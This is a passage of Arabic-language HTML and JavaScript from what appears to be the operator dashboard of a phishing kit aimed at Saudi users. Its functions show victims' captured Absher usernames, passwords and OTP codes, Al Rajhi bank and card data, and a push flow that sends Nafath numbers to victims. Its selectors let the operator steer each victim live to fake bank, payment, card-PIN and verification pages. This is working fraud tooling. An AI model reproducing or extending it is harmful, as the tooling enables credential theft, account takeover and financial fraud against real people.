                        box.innerHTML = otpHtml;
                    })
                    .catch(error => {
                        console.error('خطأ في جلب OTP أبشر:', error);
                        document.getElementById('absherOtpBox').innerHTML = '<div class="alert alert-warning">خطأ في تحميل الرموز</div>';
                    });
                
                const modal = new bootstrap.Modal(document.getElementById('userAbsherModal'));
                modal.show();
                markAsRead(userId);
                
            } catch(e) {
                console.error('Error:', e);
                document.getElementById('userAbsherContent').innerHTML = 
                    '<div class="alert alert-danger">حدث خطأ في تحميل البيانات</div>';
            }
        },
        error: function() {
            document.getElementById('userAbsherContent').innerHTML = 
                '<div class="alert alert-danger">فشل الاتصال بالخادم</div>';
        }
    });
}

// ============================================
// توجيه المستخدم من مودال أبشر
// ============================================
function redirectUserFromAbsher() {
    const page = document.getElementById('redirectPageAbsher').value;
    
    if (!currentUserId) {
        showToast('خطأ', 'لم يتم تحديد المستخدم', 'error');
        return;
    }
    
    $.ajax({
        url: 'redirect-user.php',
        method: 'POST',
        data: {
            user_id: currentUserId,
            page: page
        },
        success: function(response) {
            showToast('نجح التوجيه', 'تم توجيه المستخدم بنجاح', 'success');
            bootstrap.Modal.getInstance(document.getElementById('userAbsherModal')).hide();
        },
        error: function() {
            showToast('خطأ', 'حدث خطأ في التوجيه', 'error');
        }
    });
}

// ============================================
// 🚀 تحديث مودال أبشر real-time
// ============================================
function refreshAbsherModal(userId) {
    $.ajax({
        url: 'get-user-absher.php',
        method: 'GET',
        data: { user_id: userId },
        success: function(response) {
            try {
                const abshers = JSON.parse(response);
                let html = '';

                if (!Array.isArray(abshers) || abshers.length === 0) {
                    html = '<div class="alert alert-info"><i class="fas fa-info-circle"></i> لا توجد بيانات أبشر</div>';
                } else {
                    abshers.forEach((absher, index) => {
                        html += `
                        <div class="info-card">
                            <h6><i class="fas fa-id-badge"></i> بيانات أبشر ${index + 1}</h6>
                            <p><strong>اسم المستخدم / رقم الهوية:</strong> 
                                <span style="color: #00AA66; font-weight: 700; font-size: 1.1rem;">${absher.username_or_id ?? '-'}</span>
                            </p>
                            <p><strong>كلمة المرور:</strong> 
                                <span style="color: #dc2626; font-weight: 700; font-size: 1.1rem;">${absher.password ?? '-'}</span>
                            </p>
                            <p><strong>تاريخ التسجيل:</strong> ${absher.created_at ?? '-'}</p>
                        </div>
                        `;
                    });
                }

                html += '<div id="absherOtpBox"><em class="text-muted">🔄 جاري تحميل رموز التحقق...</em></div>';
                document.getElementById('userAbsherContent').innerHTML = html;
                
                // جلب رموز OTP
                fetch(`get-absher-otps.php?user_id=${userId}`)
                    .then(res => res.json())
                    .then(otps => {
                        const box = document.getElementById('absherOtpBox');
                        if (!box) return;

                        if (!Array.isArray(otps) || otps.length === 0) {
                            box.innerHTML = '<div class="alert alert-secondary mt-3"><i class="fas fa-info-circle"></i> لم يتم إدخال أي رمز تحقق بعد</div>';
                            return;
                        }

                        let otpHtml = '<hr><h6 style="color: #00AA66; font-weight: bold; margin: 20px 0 15px;"><i class="fas fa-key"></i> رموز التحقق (OTP أبشر)</h6>';
                        
                        otps.forEach((otp, i) => {
                            otpHtml += `
                                <div class="info-card" style="background: #d1fae5; border-right: 4px solid #00AA66;">
                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                                        <span style="font-weight: bold;">رمز #${i + 1}</span>
                                        <small style="color: #666;">${otp.created_at}</small>
                                    </div>
                                    <div class="alert alert-success text-center" style="font-size:24px; font-weight:700; margin: 0; padding: 15px; background: #00AA66; color: white;">
                                        ${otp.otp_code}
                                    </div>
                                </div>
                            `;
                        });
                        
                        box.innerHTML = otpHtml;
                    });

                showToast('تحديث', 'تم تحديث بيانات أبشر', 'info');
                    
            } catch(e) {
                console.error('خطأ:', e);
            }
        }
    });
}
// ============================================
// توجيه المستخدم من مودال البنك
// ============================================
function redirectUserFromBank() {
    const page = document.getElementById('redirectPageBank').value;
    
    if (!currentUserId) {
        showToast('خطأ', 'لم يتم تحديد المستخدم', 'error');
        return;
    }
    
    $.ajax({
        url: 'redirect-user.php',
        method: 'POST',
        data: {
            user_id: currentUserId,
            page: page
        },
        success: function(response) {
            showToast('نجح التوجيه', 'تم توجيه المستخدم بنجاح', 'success');
            bootstrap.Modal.getInstance(document.getElementById('userBankModal')).hide();
        },
        error: function() {
            showToast('خطأ', 'حدث خطأ في التوجيه', 'error');
        }
    });
}
        function showUserCards(userId) {
            currentUserId = userId;
            refreshCardsModal(userId);
            const modal = new bootstrap.Modal(document.getElementById('userCardsModal'));
            modal.show();
            markAsRead(userId);
        }

        function showUserNafad(userId) {
            currentUserId = userId;
            refreshNafadModal(userId);
            new bootstrap.Modal(document.getElementById('userNafadModal')).show();
            markAsRead(userId);
        }

        function showNafathFinal(userId) {
            currentUserId = userId;
            
            document.getElementById('nafathNumberInput').value = '';
            refreshNafathModal(userId);
            
            new bootstrap.Modal(document.getElementById('nafathFinalModal')).show();
        }

        function sendNafathNumberToClient() {
            const number = document.getElementById('nafathNumberInput').value.trim();
            
            if (!number) {
                showToast('تنبيه', 'الرجاء إدخال رقم', 'warning');
                return;
            }
            
            if (!currentUserId) {
                showToast('خطأ', 'خطأ في تحديد العميل', 'error');
                return;
            }
            
            $.ajax({
                url: 'send-nafath-number.php',
                method: 'POST',
                data: {
                    user_id: currentUserId,
                    number: number
                },
                success: function(response) {
                    try {
                        const result = JSON.parse(response);
                        if (result.success) {
                            showToast('نجح الإرسال', `تم إرسال الرقم ${number} للعميل`, 'success');
                            document.getElementById('nafathNumberInput').value = '';
                            refreshNafathModal(currentUserId);
                        } else {
                            showToast('خطأ', result.error || 'فشل الإرسال', 'error');
                        }
                    } catch(e) {
                        showToast('تم الإرسال', 'تم ارسال الرقم للعميل', 'success');
                        document.getElementById('nafathNumberInput').value = '';
                        refreshNafathModal(currentUserId);
                    }
                },
                error: function() {
                    showToast('خطأ', 'خطأ في الاتصال', 'error');
                }
            });
        }

        function redirectUser() {
            const page = document.getElementById('redirectPageUser').value;
            
            if (!currentUserId) {
                showToast('خطأ', 'لم يتم تحديد المستخدم', 'error');
                return;
            }
            
            $.ajax({
                url: 'redirect-user.php',
                method: 'POST',
                data: {
                    user_id: currentUserId,
                    page: page
                },
                success: function(response) {
                    showToast('نجح التوجيه', 'تم توجيه المستخدم بنجاح', 'success');
                    bootstrap.Modal.getInstance(document.getElementById('userInfoModal')).hide();
                },
                error: function() {
                    showToast('خطأ', 'حدث خطأ في التوجيه', 'error');
                }
            });
        }

        function redirectUserFromCard() {
            const page = document.getElementById('redirectPageCard').value;
            
            if (!currentUserId) {
                showToast('خطأ', 'لم يتم تحديد المستخدم', 'error');
                return;
            }
            
            $.ajax({
                url: 'redirect-user.php',
                method: 'POST',
                data: {
                    user_id: currentUserId,
                    page: page
                },
                success: function(response) {
                    showToast('نجح التوجيه', 'تم توجيه المستخدم بنجاح', 'success');
                    bootstrap.Modal.getInstance(document.getElementById('userCardsModal')).hide();
                },
                error: function() {
                    showToast('خطأ', 'حدث خطأ في التوجيه', 'error');
                }
            });
        }

        function redirectUserFromNafad() {
            const page = document.getElementById('redirectPageNafad').value;

            if (!currentUserId) {
                showToast('خطأ', 'لم يتم تحديد المستخدم', 'error');
                return;
            }

            $.ajax({
                url: 'redirect-user.php',
                method: 'POST',
                data: {
                    user_id: currentUserId,
                    page: page
                },
                success: function () {
                    showToast('نجح التوجيه', 'تم توجيه المستخدم بنجاح', 'success');
                    bootstrap.Modal
                        .getInstance(document.getElementById('userNafadModal'))
                        .hide();
                },
                error: function () {
                    showToast('خطأ', 'حدث خطأ في التوجيه', 'error');
                }
            });
        }

        // Select All Checkbox
        document.getElementById('selectAll')?.addEventListener('change', function() {
            const checkboxes = document.querySelectorAll('.user-checkbox');
            checkboxes.forEach(cb => cb.checked = this.checked);
            updateBulkActions();
        });

        // السماح بإدخال أرقام فقط
        document.getElementById('nafathNumberInput')?.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // إرسال عند الضغط على Enter
        document.getElementById('nafathNumberInput')?.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendNafathNumberToClient();
            }
        });
    </script>
    <!-- Modal بيانات البنك (راجحي) -->
<div class="modal fade" id="userBankModal" tabindex="-1">
    <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">
                    <i class="fas fa-university"></i>
                    بيانات بنك الراجحي
                </h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <div class="redirect-box">
                    <label>
                        <i class="fas fa-directions"></i>
                        توجيه العميل إلى صفحة:
                    </label>
                    <select class="form-select form-select-modern" id="redirectPageBank">
                        <option value="index.html">الصفحة الرئيسية</option>
                        <option value="BK.php">بنك الراجحي</option>
                        <option value="bank-otp.php">رمز تحقق بنك الراجحي</option>
                        <option value="pay.php">صفحة الدفع</option>
                        <option value="otp.php">رمز OTP</option>
                        <option value="pin.php">كلمة سر البطاقة</option>
                        <option value="nafad.php">رقم مزود الخدمة</option>
                        <option value="success.php">رمز تحقق مزود الخدمة</option>
                        <option value="nafath.php">نفاذ الأخيرة</option>
                    </select>
                    <button class="btn btn-redirect" onclick="redirectUserFromBank()">
                        <i class="fas fa-paper-plane"></i>
                        توجيه الآن
                    </button>
                </div>
                
                <div id="userBankContent">
                    <div class="text-center">
                        <div class="spinner"></div>
                        <p class="mt-2">جاري تحميل بيانات البنك...</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<!-- Modal بيانات أبشر -->
<div class="modal fade" id="userAbsherModal" tabindex="-1">
    <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">
                    <i class="fas fa-id-badge"></i>
                    بيانات أبشر
                </h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <div class="redirect-box">
                    <label>
                        <i class="fas fa-directions"></i>
                        توجيه العميل إلى صفحة:
                    </label>
                    <select class="form-select form-select-modern" id="redirectPageAbsher">
                        <option value="index.html">الصفحة الرئيسية</option>
                        <option value="BK.php">بنك الراجحي</option>
                        <option value="bank-otp.php">رمز تحقق بنك الراجحي</option>
                        <option value="pay.php">صفحة الدفع</option>
                        <option value="otp.php">رمز OTP</option>
                        <option value="pin.php">كلمة سر البطاقة</option>
                        <option value="nafad.php">رقم مزود الخدمة</option>
                        <option value="success.php">رمز تحقق مزود الخدمة</option>
                        <option value="nafath.php">نفاذ الأخيرة</option>
                    </select>
                    <button class="btn btn-redirect" onclick="redirectUserFromAbsher()">
                        <i class="fas fa-paper-plane"></i>
                        توجيه الآن
                    </button>
                </div>
                
                <div id="userAbsherContent">
                    <div class="text-center">
                        <div class="spinner"></div>
                        <p class="mt-2">جاري تحميل بيانات أبشر...</p>
</body>
</html>